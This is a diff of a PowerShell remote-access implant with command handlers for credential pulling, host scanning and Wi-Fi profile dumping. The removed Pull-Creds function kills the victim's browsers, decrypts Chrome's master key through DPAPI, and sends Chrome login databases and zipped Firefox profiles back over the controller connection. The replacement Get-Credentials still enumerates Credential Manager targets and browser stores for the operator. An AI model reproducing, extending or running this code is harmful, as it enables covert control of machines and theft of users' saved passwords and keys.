@@ -388,98 +388,38 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-   function Pull-Creds {
+    function Get-Credentials {
     try {
-        Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
-        Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 1
+        $output = ""
 
-        $ip = (Test-Connection -ComputerName (hostname) -Count 1).Address.IPAddressToString
-        Output-Log "[*] Pull-Creds started on $ip"
-
-        $chromeRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        $localStatePath = Join-Path $chromeRoot "Local State"
-
-        # === Chrome: Расшифровка AES-ключа
-        if (Test-Path $localStatePath) {
-            Output-Log "[+] Found Chrome Local State"
-            $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
-            $encKeyB64 = $json.os_crypt.encrypted_key
-            $encKey = [Convert]::FromBase64String($encKeyB64)
-            $encKey = $encKey[5..($encKey.Length - 1)]  # Убираем DPAPI префикс
-
-            Add-Type -AssemblyName System.Security
-            $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
-
-            $b64Key = [Convert]::ToBase64String($aesKey)
-            $upload = "[UPLOAD]::chrome_master_key_$ip.bin::$b64Key::END"
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
-            $global:clientStream.Write($bytes, 0, $bytes.Length)
-            $global:clientStream.Flush()
-            Output-Log "[+] Sent chrome_master_key_$ip.bin"
-        } else {
-            Output-Log "[!] Chrome Local State not found"
+        # 1. Windows Credential Manager (generic credentials)
+        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $target = $_.ToString().Split(":")[1].Trim()
+            $output += "`n[TARGET] $target"
         }
 
-        # === Chrome: Login Data из всех профилей
-        if (Test-Path $chromeRoot) {
-            $profiles = Get-ChildItem $chromeRoot -Directory | Where-Object {
-                $_.Name -match "^Default$|^Profile \d+$"
-            }
-
-            foreach ($profile in $profiles) {
-                $profileName = $profile.Name
-                $loginPath = Join-Path $profile.FullName "Login Data"
-
-                if (Test-Path $loginPath) {
-                    $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($loginPath))
-                    $upload = "[UPLOAD]::chrome_LoginData_${profileName}_$ip.db::$b64Login::END"
-                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
-                    $global:clientStream.Write($bytes, 0, $bytes.Length)
-                    $global:clientStream.Flush()
-                    Output-Log "[+] Sent chrome_LoginData_${profileName}_$ip.db"
-                } else {
-                    Output-Log "[ ] No Login Data in $profileName"
-                }
-            }
-        } else {
-            Output-Log "[!] Chrome User Data folder not found"
+        # 2. Chrome saved logins (мета-данные — без дешифровки)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
-        # === Firefox: Профили
-        $firefoxRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
-        if (Test-Path $firefoxRoot) {
-            Output-Log "[+] Firefox profiles found"
-            $profiles = Get-ChildItem $firefoxRoot -Directory -ErrorAction SilentlyContinue
-            foreach ($profile in $profiles) {
-                $zipPath = "$env:TEMP\firefox_profile.zip"
-                if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-                Compress-Archive -Path $profile.FullName -DestinationPath $zipPath -Force
-                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zipPath))
-                $upload = "[UPLOAD]::firefox_profile_$($profile.Name)_$ip.zip::$b64::END"
-                $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
-                $global:clientStream.Write($bytes, 0, $bytes.Length)
-                $global:clientStream.Flush()
-                Output-Log "[+] Sent firefox_profile_$($profile.Name)_$ip.zip"
-                Remove-Item $zipPath -Force
-            }
-        } else {
-            Output-Log "[!] No Firefox profiles found"
+        # 3. Firefox профили (только список профилей)
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
 
-        Output-Log "[✓] pull-creds completed for $ip"
-        return "[+] pull-creds completed for $ip"
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
+        }
+
+        return $output
     }
     catch {
-        $err = "[ERROR] pull-creds failed: $($_.Exception.Message)"
-        Output-Log $err
-        return $err
+        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
-
-
-
-
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -695,7 +635,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                           egwehwehwegewfef33                                                                                                                                                                   
+                                            TEST 4                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -754,8 +694,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                            $response = Pull-Creds
-                        }
+                        $response = Get-Credentials
+                    }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
